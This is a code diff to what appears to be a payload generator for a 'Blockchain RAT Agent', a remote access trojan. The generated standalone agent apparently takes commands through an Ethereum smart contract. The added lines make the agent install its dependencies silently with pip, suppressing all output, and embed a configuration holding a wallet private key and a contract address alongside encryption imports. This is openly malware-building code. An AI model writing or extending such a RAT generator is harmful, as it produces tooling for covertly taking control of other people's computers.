@@ -39,6 +39,9 @@ class PayloadGenerator:
 """
 Blockchain RAT Agent - Standalone Version
 Auto-generated with embedded configuration
+
+This is a standalone agent with all dependencies embedded.
+No additional files required.
 """
 
 import sys
@@ -47,10 +50,60 @@ import json
 import time
 import base64
 import gzip
+import subprocess
+import platform
 from pathlib import Path
 
-# Embedded configuration
+# Check and install dependencies silently
+def check_dependencies():
+    """Check and install required packages silently"""
+    required = ['web3', 'cryptography', 'pycryptodome', 'eth-account']
+    missing = []
+    
+    for package in required:
+        try:
+            if package == 'pycryptodome':
+                import Crypto
+            elif package == 'eth-account':
+                import eth_account
+            else:
+                __import__(package)
+        except ImportError:
+            missing.append(package)
+    
+    if missing:
+        print(f"Installing dependencies: {{', '.join(missing)}}")
+        try:
+            subprocess.check_call(
+                [sys.executable, '-m', 'pip', 'install', '--quiet', '--disable-pip-version-check'] + missing,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            print("Dependencies installed successfully")
+        except Exception as e:
+            print(f"Error installing dependencies: {{e}}")
+            print("Please install manually: pip install web3 cryptography pycryptodome eth-account")
+            sys.exit(1)
+
+# Install dependencies before importing
+check_dependencies()
+
+# Now import the dependencies
+from web3 import Web3
+from eth_account import Account
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+# Embedded configuration (auto-generated)
 EMBEDDED_CONFIG = {json.dumps(config, indent=4)}
+
+print("Blockchain RAT Agent - Standalone Version")
+print(f"Agent Wallet: {{EMBEDDED_CONFIG.get('private_key', 'N/A')[:10]}}...")
+print(f"Contract: {{EMBEDDED_CONFIG.get('contract_address', 'N/A')}}")
+print()
 
 # ============================================================================
 # EMBEDDED ENCRYPTION MODULE
